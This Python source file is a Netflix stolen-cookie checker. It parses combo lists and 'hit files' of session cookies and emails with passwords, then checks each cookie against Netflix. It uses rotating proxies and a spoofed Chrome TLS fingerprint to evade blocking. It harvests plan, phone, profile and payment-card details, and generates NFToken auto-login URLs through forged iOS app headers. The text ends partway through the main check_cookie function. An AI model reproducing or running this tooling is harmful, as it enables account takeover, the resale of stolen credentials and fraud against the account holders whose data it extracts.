import json
import re
import logging
import time
import threading as _threading
import concurrent.futures as _cf
from typing import Optional
from datetime import datetime

# ---------------------------------------------------------------------------
# Proxy manager — rotating proxy pool for IP rotation / ban protection.
# Zero-config by default; add proxies via PROXY_LIST env var or proxies.txt.
# ---------------------------------------------------------------------------
try:
    from proxy_manager import proxy_manager as _proxy_manager
    _PROXY_ENABLED = True
except Exception:
    _proxy_manager = None  # type: ignore
    _PROXY_ENABLED = False

try:
    from curl_cffi import requests as _curl_requests
    _CURL_AVAILABLE = True
except ImportError:
    import requests as _curl_requests
    _CURL_AVAILABLE = False

import requests
import requests.adapters

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)


# ---------------------------------------------------------------------------
# JS hex-escape decoder (Netflix uses \xNN sequences in inline JS)
# ---------------------------------------------------------------------------

def _decode_js_hex(s: str) -> str:
    """Convert JavaScript \\xNN hex escape sequences to real characters."""
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)


def _clean_price(s: str) -> str:
    """Decode unicode currency symbols and clean up price strings."""
    if not s:
        return s
    # Handle raw \\uNNNN sequences that were NOT yet decoded by JSON
    # (i.e. the string literally contains backslash-u sequences)
    if '\\u' in s or '\\U' in s:
        try:
            s = s.encode('ascii').decode('unicode_escape')
        except Exception:
            pass
    # Clean up non-breaking spaces
    s = s.replace('\u00a0', ' ').replace('\xa0', ' ').strip()
    return s


# ---------------------------------------------------------------------------
# Netflix page data helpers
# ---------------------------------------------------------------------------

def _extract_reactcontext(html: str) -> dict:
    """
    Extract and parse the 'netflix.reactContext' JSON blob.
    Fixes JavaScript \\xNN hex escape sequences before parsing.
    """
    anchors = [
        "netflix.reactContext = {",
        "netflix.reactContext={",
    ]
    for anchor in anchors:
        pos = html.find(anchor)
        if pos == -1:
            continue
        brace_pos = html.index("{", pos + len(anchor) - 1)
        raw_chunk = html[brace_pos: brace_pos + 3_000_000]
        raw_fixed = _decode_js_hex(raw_chunk)

        depth = 0
        in_str = False
        esc = False
        i = 0
        while i < len(raw_fixed):
            c = raw_fixed[i]
            if esc:
                esc = False
            elif c == "\\" and in_str:
                esc = True
            elif c == '"':
                in_str = not in_str
            elif not in_str:
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        try:
                            return json.loads(raw_fixed[:i + 1])
                        except json.JSONDecodeError:
                            pass
                        break
            i += 1
    return {}


def _parse_date(val) -> str:
    if not val:
        return ""
    s = str(val).strip().rstrip("Z")
    try:
        s = s.encode("raw_unicode_escape").decode("unicode_escape")
    except Exception:
        pass
    s = s.replace("\\x20", " ").replace("\\u0020", " ").replace("&nbsp;", " ").strip()

    if re.search(r'[A-Za-z]', s) and re.search(r'\d', s):
        m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
        if m:
            try:
                return datetime(int(m.group(1)), int(m.group(2)), int(m.group(3))).strftime("%B %d, %Y")
            except Exception:
                pass
        return s

    if re.match(r'^\d+$', s):
        ts = int(s)
        try:
            if ts > 9_999_999_999:
                return datetime.utcfromtimestamp(ts / 1000).strftime("%B %d, %Y")
            return datetime.utcfromtimestamp(ts).strftime("%B %d, %Y")
        except Exception:
            pass

    m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
    if m:
        try:
            return datetime(int(m.group(1)), int(m.group(2)), int(m.group(3))).strftime("%B %d, %Y")
        except Exception:
            pass
    return s


BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
}

# Login page markers — if any are found in the response body, cookie is invalid.
# These are deliberately specific to avoid matching valid account pages.
_LOGIN_PAGE_MARKERS = (
    'name="userLoginId"',
    '"signupContext":"login"',
    '"pageType":"login"',
    '"page-type" content="login"',
    'id="login-button"',
    '"authURL":"',
    '"context":"login"',
    'class="login-content"',
)

# Rate limit / block markers in response body
_RATE_LIMIT_MARKERS = (
    '"429"',
    'Too Many Requests',
    'rate limit',
    'Your request has been blocked',
    'Access Denied',
    'cf-error-details',
    'Cloudflare',
)


def _is_login_page(url: str, html: str) -> bool:
    """Return True if the response is a Netflix login page (invalid cookie)."""
    if "login" in url or "signin" in url.lower():
        return True
    if html and any(m in html[:4000] for m in _LOGIN_PAGE_MARKERS):
        return True
    return False


def _is_rate_limited(status_code: int, html: str) -> bool:
    """Return True if Netflix is rate-limiting or blocking this IP."""
    if status_code == 429:
        return True
    if status_code in (403, 503) and html and any(m in html[:2000] for m in _RATE_LIMIT_MARKERS):
        return True
    return False

QUALITY_MAP = {
    "UHD": "4K+HDR",
    "ULTRA_HD": "4K+HDR",
    "HD": "1080p",
    "HIGH": "1080p",
    "MEDIUM": "720p",
    "SD": "480p",
    "LOW": "480p",
}

PLAN_MAP = {
    "standard with ads": {"name": "Standard with Ads", "quality": "1080p", "streams": 2},
    "standard": {"name": "Standard", "quality": "1080p", "streams": 2},
    "basic": {"name": "Basic", "quality": "480p", "streams": 1},
    "mobile": {"name": "Mobile", "quality": "480p", "streams": 1},
    "premium": {"name": "Premium", "quality": "4K+HDR", "streams": 4},
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-A2111-D4F5B3A6E7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "pathFormat": "graph",
    "responseFormat": "json",
    "path": '["account","token","default"]',
    "config": json.dumps({"device_type": "NFAPPL-02-", "idiom": "phone", "iosVersion": "15.8.5", "appVersion": "15.48.1"}),
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "x-netflix.client.type": "argo",
    "x-netflix.request.routing": json.dumps({"path": "/nq/mobile/nqios/~15.48.0/user", "control_tag": "iosui_argo"}),
    "x-netflix.context": "{}",
    "x-netflix.profiles": "{}",
    "x-netflix.app-version": "15.48.1",
    "x-netflix.idiom": "phone",
    "x-netflix.os.version": "15.8.5",
    "x-netflix.device.model": "iPhone8,1",
}


# ---------------------------------------------------------------------------
# Combo / pipe-delimited parser
# ---------------------------------------------------------------------------

def is_combo_line(text: str) -> bool:
    for line in text.splitlines():
        line = line.strip()
        if line and "|" in line and "NetflixId" in line and "=" in line:
            return True
    return False


def parse_combo_line(line: str) -> dict | None:
    line = line.strip()
    if not line or "|" not in line or "NetflixId" not in line:
        return None
    parts = [p.strip() for p in line.split("|")]
    result: dict = {"cookies": {}}
    first = parts[0]
    if ":" in first:
        email, _, password = first.partition(":")
        result["email"] = email.strip()
        if password.strip():
            result["password"] = password.strip()
    elif "@" in first:
        result["email"] = first.strip()
    for part in parts[1:]:
        if "=" not in part:
            continue
        key, _, value = part.partition("=")
        key = key.strip()
        value = value.strip()
        if key == "NetflixId":
            result["cookies"]["NetflixId"] = value
        elif key == "SecureNetflixId":
            result["cookies"]["SecureNetflixId"] = value
        elif key == "nfvdid":
            result["cookies"]["nfvdid"] = value
        elif key == "Country":
            result["country"] = value
        elif key == "memberPlan":
            pname = value.strip()
            _norm = pname.lower()
            if _norm in ("base", "basico", "básico"):
                pname = "Basic"
            elif _norm in ("cao cấp", "standard with ads"):
                pname = "Standard with Ads"
            result["plan_name"] = pname
            for map_key, info in PLAN_MAP.items():
                if map_key in _norm or _norm in map_key:
                    result.setdefault("quality", info["quality"])
                    result.setdefault("max_streams", info["streams"])
                    break
        elif key == "memberSince":
            result["member_since"] = value
        elif key == "videoQuality":
            result["quality"] = value
        elif key == "maxStreams":
            try:
                result["max_streams"] = int(value)
            except ValueError:
                result["max_streams"] = value
        elif key == "Price":
            result["price"] = value
        elif key in ("PaymentMethod", "paymentType"):
            existing = result.get("payment", "")
            result["payment"] = f"{existing} / {value}".lstrip(" /") if existing else value
        elif key == "phonenumber":
            result["phone"] = value
    if not result["cookies"].get("NetflixId"):
        return None
    return result


# ---------------------------------------------------------------------------
# Cookie parsers
# ---------------------------------------------------------------------------

def parse_netscape_cookies(text: str) -> dict:
    cookies = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
    return cookies


def parse_json_cookies(text: str) -> dict:
    cookies = {}
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and "name" in item and "value" in item:
                    cookies[item["name"]] = item["value"]
        elif isinstance(data, dict):
            cookies = data
    except json.JSONDecodeError:
        pass
    return cookies


def parse_header_cookies(text: str) -> dict:
    """Parse a single-line cookie string: name=value; name=value ..."""
    cookies = {}
    for part in text.split(";"):
        part = part.strip()
        if "=" in part:
            name, _, value = part.partition("=")
            name = name.strip()
            value = value.strip()
            # Only keep short, clean cookie names — reject multi-line garbage keys
            if name and len(name) < 80 and "\n" not in name:
                cookies[name] = value
    return cookies


# Matches lines like:  • Cookies     : nfvdid=...; NetflixId=...
# Also handles:        Cookies: ...,  Cookie : ...,  • Cookie:  ...
_HIT_COOKIE_LINE_RE = re.compile(
    r'^[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*(.+)',
)

_SESSION_KEYS = {"NetflixId", "SecureNetflixId", "nfvdid", "gsid"}


def parse_hit_file_cookies(text: str) -> dict:
    """
    Parse cookies from a structured hit-file block (rayen76/similar bots).
    Finds the '• Cookies : nfvdid=...; NetflixId=...' line and parses only that.
    The rest of the block (Name, Email, Plan, etc.) is safely ignored.
    """
    for line in text.splitlines():
        m = _HIT_COOKIE_LINE_RE.match(line.strip())
        if not m:
            continue
        cookie_string = m.group(1).strip()
        if len(cookie_string) < 10:
            continue
        result = parse_header_cookies(cookie_string)
        # Only return if at least one real Netflix session cookie was found
        if result and any(k in result for k in _SESSION_KEYS):
            return result
    return {}


def auto_parse_cookies(text: str) -> dict:
    text = text.strip()
    if not text:
        return {}
    if text.startswith("[") or text.startswith("{"):
        result = parse_json_cookies(text)
        if result:
            return result
    result = parse_netscape_cookies(text)
    if result:
        return result
    for line in text.splitlines():
        parsed = parse_combo_line(line)
        if parsed and parsed.get("cookies"):
            return parsed["cookies"]
    # Hit-file format (• Cookies : ...) — must come BEFORE parse_header_cookies
    # to avoid the fallback turning the whole multi-line block into garbage keys
    result = parse_hit_file_cookies(text)
    if result:
        return result
    # Newline-separated format: each line is a "key=value" cookie
    # e.g. text copied from a hit card:
    #   NetflixId=ct%3D...
    #   SecureNetflixId=v%3D3%26...
    #   nfvdid=BQFm...
    if "\n" in text:
        nl_cookies: dict[str, str] = {}
        for line in text.splitlines():
            line = line.strip()
            if not line or "=" not in line or "\t" in line:
                continue
            name, _, value = line.partition("=")
            name = name.strip()
            if name and len(name) < 80:
                nl_cookies[name] = value.strip()
        if nl_cookies and any(k in nl_cookies for k in _SESSION_KEYS):
            return nl_cookies
    # Last resort: treat the whole text as a single-line cookie header
    return parse_header_cookies(text)


_NETFLIX_ID_RE = re.compile(
    r'(?<![A-Za-z])NetflixId[\t "\'=:\s]*([^\t "\'&;\n\r|,]{10,})',
)


def universal_extract_accounts(text: str) -> list[str]:
    lines = text.splitlines()
    nf_hits: list[tuple[int, str]] = []
    seen: set[str] = set()
    for i, line in enumerate(lines):
        m = _NETFLIX_ID_RE.search(line)
        if not m:
            continue
        val = m.group(1).strip().rstrip('",;|\')')
        if val and val not in seen:
            seen.add(val)
            nf_hits.append((i, val))
    if len(nf_hits) <= 1:
        return []
    blocks: list[str] = []
    for idx, (line_no, _) in enumerate(nf_hits):
        start = 0 if idx == 0 else (nf_hits[idx - 1][0] + line_no) // 2 + 1
        end = len(lines) if idx == len(nf_hits) - 1 else (line_no + nf_hits[idx + 1][0]) // 2 + 1
        block = "\n".join(lines[start:end]).strip()
        if block:
            blocks.append(block)
    return blocks


def extract_file_metadata(text: str) -> dict:
    meta = {}
    email_match = re.search(r'DETAILS:\s*(.+)', text, re.IGNORECASE)
    if email_match:
        email = email_match.group(1).strip().replace("\\x40", "@").replace("%40", "@")
        meta["email"] = email
    bracket = re.search(
        r'\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]-\[([^\]]+)\]', text
    )
    if bracket:
        meta["country"] = bracket.group(2).strip()
        meta["plan_name"] = bracket.group(3).strip()
        meta["quality"] = bracket.group(4).strip()
        meta["next_billing"] = bracket.group(5).strip()
        meta["payment"] = bracket.group(6).strip()
        plan_lower = meta["plan_name"].lower()
        for key, info in PLAN_MAP.items():
            if key in plan_lower:
                meta["max_streams"] = info["streams"]
                break
    return meta


# ---------------------------------------------------------------------------
# NFToken generator
# ---------------------------------------------------------------------------

def generate_nftoken(cookies: dict) -> dict:
    netflix_id = cookies.get("NetflixId") or cookies.get("netflixId")
    if not netflix_id:
        return {"success": False, "error": "NetflixId cookie not found"}
    proxy_dict = _proxy_manager.get_proxies_dict() if _PROXY_ENABLED and _proxy_manager else None
    try:
        resp = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_PARAMS,
            headers={**NFTOKEN_HEADERS, "Cookie": f"NetflixId={netflix_id}"},
            proxies=proxy_dict,
            timeout=8,
        )
        if resp.status_code != 200:
            return {"success": False, "error": f"API returned HTTP {resp.status_code}"}
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        expires = token_data.get("expires")
        if not token:
            return {"success": False, "error": "Token not found in API response"}
        return {
            "success": True,
            "pc_url": f"https://netflix.com/?nftoken={token}",
            "mobile_url": f"https://netflix.com/unsupported?nftoken={token}",
            "expires": str(expires) if expires else None,
            "error": None,
        }
    except requests.exceptions.Timeout:
        if proxy_dict and _proxy_manager:
            _proxy_manager.mark_failure(proxy_dict.get("https", ""))
        return {"success": False, "error": "NFToken request timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ---------------------------------------------------------------------------
# Targeted field extractors
# ---------------------------------------------------------------------------

def _brace_extract(html: str, start_pos: int) -> dict | list | None:
    """Parse a JSON object/array starting at start_pos in html."""
    raw = _decode_js_hex(html[start_pos:start_pos + 100000])
    opening = raw[0] if raw else ''
    closing = '}' if opening == '{' else ']'
    depth = 0
    in_str = False
    esc = False
    for i, c in enumerate(raw):
        if esc:
            esc = False
        elif c == '\\' and in_str:
            esc = True
        elif c == '"':
            in_str = not in_str
        elif not in_str:
            if c in '{[':
                depth += 1
            elif c in ']}':
                depth -= 1
                if depth == 0:
                    try:
                        return json.loads(raw[:i + 1])
                    except Exception:
                        return None
    return None


def _extract_userinfo(html: str) -> dict:
    """Extract models.userInfo.data from inline reactContext JS."""
    m = re.search(r'"userInfo"\s*:\s*\{[^{]*"data"\s*:\s*(\{)', html)
    if not m:
        return {}
    result = _brace_extract(html, m.start(1))
    return result if isinstance(result, dict) else {}


def _falcon_val(field: dict):
    """Unwrap a Falcon-typed field: {"fieldType":"...", "value": X} → X"""
    if isinstance(field, dict):
        return field.get("value")
    return field


def _extract_member_plan(html: str) -> dict:
    """
    Extract plan fields from the MemberPlan fieldGroup.
    Returns: plan_name, quality, max_streams, has_ads, plan_id,
             next_billing, price, is_on_hold, num_extra_members, show_payment
    """
    result = {}
    # Find currentPlan MemberPlan block
    m = re.search(
        r'"currentPlan"\s*:\s*\{[^{]*"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)',
        html
    )
    if not m:
        m = re.search(r'"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)', html)
    if not m:
        return result

    fields = _brace_extract(html, m.start(1))
    if not isinstance(fields, dict):
        return result

    fv = _falcon_val

    plan_name = fv(fields.get("localizedPlanName")) or fv(fields.get("planName"))
    raw_quality = fv(fields.get("videoQuality"))
    max_streams = fv(fields.get("maxStreams"))
    has_ads = fv(fields.get("hasAds"))
    plan_id = fv(fields.get("planId"))
    next_billing_raw = fv(fields.get("nextBillingDate"))
    price_raw = fv(fields.get("planPrice")) or fv(fields.get("formattedPlanPrice"))
    is_on_hold = fv(fields.get("isOnHold"))
    num_extra = fv(fields.get("numExtraMembers"))
    bobo = fv(fields.get("bobo"))

    if plan_name:
        result["plan_name"] = str(plan_name)
    if raw_quality:
        q = str(raw_quality).upper()
        result["quality"] = QUALITY_MAP.get(q, str(raw_quality))
    if max_streams is not None:
        result["max_streams"] = str(max_streams)
    if has_ads is not None:
        result["has_ads"] = bool(has_ads)
    if plan_id:
        result["plan_id"] = str(plan_id)
    if next_billing_raw:
        result["next_billing"] = _parse_date(str(next_billing_raw))
    if price_raw:
        result["price"] = _clean_price(str(price_raw))
    if is_on_hold is not None:
        result["is_on_hold"] = bool(is_on_hold)
    if num_extra is not None:
        result["num_extra_members"] = int(num_extra) if str(num_extra).isdigit() else 0
    if bobo is not None:
        result["bobo"] = bool(bobo)

    return result


def _extract_billing_date_from_html(html: str) -> str:
    """
    Find nextBillingDate as a Falcon-typed field string value.
    e.g. "nextBillingDate":{"fieldType":"String","value":"21 April 2026"}
    """
    html_decoded = _decode_js_hex(html)
    # Match field with any fieldType (String, Numeric, etc.) before value
    patterns = [
        r'"nextBillingDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*"([^"]+)"',
        r'"nextBillingDate"\s*:\s*(\d{10,13})',
    ]
    for pat in patterns:
        for m in re.finditer(pat, html_decoded, re.IGNORECASE):
            candidate = m.group(1).strip()
            if '{' in candidate or '}' in candidate or candidate == 'null':
                continue
            result = _parse_date(candidate)
            if result:
                return result
    return ""


def _extract_price_from_html(html: str) -> str:
    """Find plan price as a Falcon-typed field."""
    html_decoded = _decode_js_hex(html)
    patterns = [
        r'"formattedPlanPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*([0-9.]+)',
        r'"planPrice"\s*:\s*"([^"]+)"',
        r'"billingAmount"\s*:\s*"?([0-9.,]+[^",]*)"?',
    ]
    for pat in patterns:
        m = re.search(pat, html_decoded, re.IGNORECASE)
        if m:
            raw = m.group(1).strip()
            if raw and raw != 'null':
                return _clean_price(raw)
    return ""


def _extract_payment_info(html: str) -> dict:
    """
    Extract payment method details from paymentMethods field.
    Returns: payment (str), card_type, card_last4, card_expiry, is_third_party, partner_name
    """
    result = {}
    html_decoded = _decode_js_hex(html)

    # Find the paymentMethods array
    m = re.search(r'"paymentMethods"\s*:\s*\{"fieldType"\s*:\s*"Custom"\s*,\s*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        m = re.search(r'"paymentMethods"\s*:\s*\{[^[]*"value"\s*:\s*(\[)', html_decoded)
    if not m:
        return result

    arr = _brace_extract(html_decoded, m.start(1))
    if not isinstance(arr, list) or not arr:
        return result

    first = arr[0]
    if isinstance(first, dict) and "value" in first:
        pm = first["value"]
        if not isinstance(pm, dict):
            return result

        def fv(key):
            f = pm.get(key, {})
            if isinstance(f, dict):
                return f.get("value")
            return f

        partner = fv("partnerDisplayName")
        is_third = fv("thirdPartyBillingPartner")
        card_type = fv("creditCardType") or fv("paymentType")
        last_four = fv("cardLastFour") or fv("lastFourDigits") or fv("lastFour")
        exp_mo = fv("cardExpirationMonth")
        exp_yr = fv("cardExpirationYear")
        is_exp = fv("isExpired")
        # Alternative payment types: UPI, wallet, netbanking etc.
        alt_method = fv("paymentMethod")
        display_text = fv("displayText")

        result["is_third_party"] = bool(is_third)
        result["partner_name"] = str(partner) if partner else ""

        parts = []
        if partner and is_third:
            parts.append(str(partner))
            result["card_type"] = str(partner)
        elif card_type:
            ct = str(card_type)
            result["card_type"] = ct.upper() if len(ct) <= 10 else ct.title()
            parts.append(result["card_type"])
            if last_four:
                result["card_last4"] = str(last_four)
                parts.append(f"···· {last_four}")
            card_expired = False
            if exp_mo and exp_yr:
                try:
                    now = datetime.now()
                    ey = int(str(exp_yr))
                    em = int(str(exp_mo))
                    card_expired = ey < now.year or (ey == now.year and em < now.month)
                except Exception:
                    pass
                exp_str = f"{str(exp_mo).zfill(2)}/{str(exp_yr)[-2:]}"
                result["card_expiry"] = exp_str
                result["card_expired"] = card_expired
                if card_expired:
                    parts.append(f"(⚠️ EXPIRED {exp_str})")
                else:
                    parts.append(f"(exp {exp_str})")
        elif alt_method:
            # UPI, Wallet, Netbanking, CC (credit/debit with display text), etc.
            method_str = str(alt_method).upper()
            disp = str(display_text).strip() if display_text else ""
            # If method is CC/DC and display looks like last-4 digits
            if method_str in ("CC", "DC", "DEBIT", "CREDIT") and re.match(r'^\d{4}$', disp):
                result["card_type"] = method_str
                result["card_last4"] = disp
                parts.append(f"{method_str} ···· {disp}")
            elif disp:
                result["card_type"] = method_str
                parts.append(f"{method_str}: {disp}")
            else:
                result["card_type"] = method_str
                parts.append(method_str)
        elif is_third:
            parts.append("Third-party billing")

        result["payment"] = " ".join(parts) if parts else ""

    return result


def _extract_profiles_list(html: str) -> tuple[list[str], int]:
    """
    Extract profile names and total profile count from the page.
    Returns (names_list, total_count).
    total_count comes from the profiles __ref array (accurate even when
    only the active profile's name is visible on the membership page).
    """
    html_decoded = _decode_js_hex(html)
    names = []
    seen = set()

    # Extract any visible profile names
    for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,60})"', html_decoded):
        name = m.group(1).strip()
        if name and name not in seen:
            seen.add(name)
            names.append(name)

    # Count from the profiles __ref array (most reliable count)
    total_count = len(names)
    m = re.search(r'"profiles"\s*:\s*(\[)', html_decoded)
    if m:
        arr = _brace_extract(html_decoded, m.start(1))
        if isinstance(arr, list) and len(arr) > total_count:
            total_count = len(arr)

    return names, total_count


def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
    """
    Recursively walk a parsed Netflix reactContext JSON object and collect
    payment / suspension signals.

    Returns list of (signal_type, human_label) tuples.
    100% language-agnostic: only inspects JSON keys and enum values,
    never page-visible text.  Netflix always keeps these in English
    regardless of what language the page is rendered in.
    """
    if depth > 12:
        return []

    hits: list[tuple[str, str]] = []

    # Enum values on status/type/state/alert/mode keys that mean "problem"
    BAD_ENUM_VALUES = {
        "SUSPENDED", "TERMINATED", "BLOCKED", "DEACTIVATED", "CLOSED",
        "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD", "PAYMENT_DECLINED",
        "BILLING_PROBLEM", "PAYMENT_FAILED", "ACCOUNT_SUSPENDED",
        "GRACE_PERIOD", "SUSPENDED_BILLING", "UPDATE_PAYMENT",
        "REACTIVATE",
    }

    # CTA action strings that ONLY appear in payment-problem flows
    PAYMENT_ACTIONS = {
        "UPDATE_PAYMENT_METHOD", "UPDATE_PAYMENT_INFO", "TRY_PAYMENT_AGAIN",
        "RETRY_PAYMENT", "REACTIVATE_ACCOUNT", "FIX_PAYMENT",
        "UPDATE_PAYMENT", "PAYMENT_UPDATE", "MANAGE_PAYMENT_METHOD",
    }

    # These keys being present with any truthy value = account problem
    ALERT_PRESENCE_KEYS = {
        "gracePeriodEndDate", "gracePeriodEnd", "gracePeriodMessage",
        "onHoldMessageText", "onHoldMessage",
        "suspendedMessageText", "suspendedMessage",
        "paymentAlertMessage", "billingAlertMessage",
        "paymentDeclinedMessage", "paymentRetryMessage",
        "paymentUpdateMessage",
    }

    # Regex: boolean-true keys that indicate a problem
    _BAD_BOOL_RE = re.compile(
        r'^(is|has|show)?(Suspended|Terminated|Locked|Blocked|'
        r'PaymentDue|PaymentDeclined|BillingProblem|PaymentFailed|'
        r'PaymentOverdue|PaymentIssue|OnHold|InGracePeriod|GracePeriod|'
        r'PaymentUpdateRequired)',
        re.IGNORECASE,
    )

    if isinstance(obj, dict):
        for key, val in obj.items():

            # ── Special case: isInGoodStanding false = bad ─────────────
            if key == "isInGoodStanding" and val is False:
                hits.append(("not_good_standing", "Account not in good standing"))

            # ── isOnHold true from MemberPlan ──────────────────────────
            elif key == "isOnHold" and val is True:
                hits.append(("on_hold_flag", "Account on hold"))

            # ── Alert/message key presence ─────────────────────────────
            elif key in ALERT_PRESENCE_KEYS:
                v = val.get("value", val) if isinstance(val, dict) else val
                if v and str(v) not in ("", "null", "false", "0"):
                    hits.append(("alert_key", f"Alert: {key}"))

            # ── Boolean-true flags ─────────────────────────────────────
            elif val is True and _BAD_BOOL_RE.match(key):
                hits.append(("bool_flag", f"Flag: {key}"))

            # ── Bad enum values on status/type/state/alert keys ────────
            elif isinstance(val, str):
                vu = val.upper()
                kl = key.lower()
                if vu in BAD_ENUM_VALUES and any(
                    x in kl for x in ("status", "type", "state", "alert", "mode", "reason")
                ):
                    hits.append(("bad_enum", f"Status: {val}"))
                # Payment action strings
                elif vu in PAYMENT_ACTIONS:
                    hits.append(("payment_action", "Payment action required"))

            # ── Recurse ────────────────────────────────────────────────
            if isinstance(val, (dict, list)):
                hits.extend(_deep_search_ctx(val, depth + 1))

    elif isinstance(obj, list):
        for item in obj[:40]:
            if isinstance(item, (dict, list)):
                hits.extend(_deep_search_ctx(item, depth + 1))

    return hits


def _detect_account_issues(html: str) -> list[str]:
    """
    Detect account warnings / restrictions.

    PRIMARY method: parse netflix.reactContext JSON with _extract_reactcontext,
    then recursively walk the full object with _deep_search_ctx.
    This is 100% language-agnostic — JSON keys / enum values are always
    English regardless of what language the UI is rendered in.

    FALLBACK: direct regex on the raw decoded HTML for fields that might
    sit outside the reactContext block.
    """
    seen: set[str] = set()
    issues: list[str] = []

    def _add(label: str) -> None:
        if label not in seen:
            seen.add(label)
            issues.append(label)

    # ── Primary: deep recursive walk of parsed reactContext JSON ─────────────
    ctx = _extract_reactcontext(html)
    if ctx:
        for _, label in _deep_search_ctx(ctx):
            _add(label)

    # ── Fallback: fast regex on raw HTML (catches inline scripts outside ctx) ─
    html_decoded = _decode_js_hex(html)

    # membershipStatus enum
    ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_decoded)
    if ms_m:
        ms = ms_m.group(1).upper()
        if ms in ("SUSPENDED", "TERMINATED", "BLOCKED", "DEACTIVATED", "CLOSED",
                  "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD"):
            _add(f"Account status: {ms}")

    # isInGoodStanding: false
    if re.search(r'"isInGoodStanding"\s*:\s*false', html_decoded, re.IGNORECASE):
        _add("Account not in good standing")

    # Boolean flags
    for flag, label in {
        "isSuspended":        "Account suspended",
        "isTerminated":       "Account terminated",
        "isOnHold":           "Account on hold",
        "paymentDeclined":    "Payment declined",
        "isPaymentDue":       "Payment due",
        "hasBillingProblem":  "Billing problem",
        "isInGracePeriod":    "Account in grace period",
    }.items():
        if re.search(rf'"{flag}"\s*:\s*true', html_decoded, re.IGNORECASE):
            _add(label)

    return issues


def _extract_phone(html: str) -> str:
    """Extract phone number from profile data."""
    html_decoded = _decode_js_hex(html)
    for m in re.finditer(r'"phoneNumber"\s*:\s*"([^"]{5,25})"', html_decoded):
        ph = m.group(1).strip()
        if ph and ph != 'null':
            return ph
    return ""


def _extract_email_verified(html: str) -> bool | None:
    """Extract email verification status."""
    html_decoded = _decode_js_hex(html)
    m = re.search(r'"isEmailVerified"\s*:\s*(true|false)', html_decoded, re.IGNORECASE)
    if m:
        return m.group(1).lower() == 'true'
    return None


# ---------------------------------------------------------------------------
# Main cookie checker
# ---------------------------------------------------------------------------

def _make_session(bulk_mode: bool):
    """
    Create an HTTP session with Chrome TLS fingerprinting (via curl_cffi) or
    fall back to a hardened requests.Session if curl_cffi is unavailable.
    Returns (session, using_curl, proxy_dict).
    proxy_dict must be passed per-request — curl_cffi ignores session.proxies
    assigned after construction, so we return it and apply it at call time.
    """
    proxy_dict = _proxy_manager.get_proxies_dict() if _PROXY_ENABLED and _proxy_manager else None

    if _CURL_AVAILABLE:
        s = _curl_requests.Session(impersonate="chrome124")
        s.headers.update(BROWSER_HEADERS)
        return s, True, proxy_dict
    # Fallback: standard requests with pooled adapter
    s = requests.Session()
    s.headers.update(BROWSER_HEADERS)
    if proxy_dict:
        s.proxies = proxy_dict
    _retries = requests.adapters.Retry(
        total=0 if bulk_mode else 1,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=4, pool_maxsize=8, max_retries=_retries
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s, False, proxy_dict


def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool = False) -> dict:
    """
    Validate a Netflix cookie and return full account info.
    bulk_mode=True  → tighter timeout (10s), no NFToken (faster for bulk).
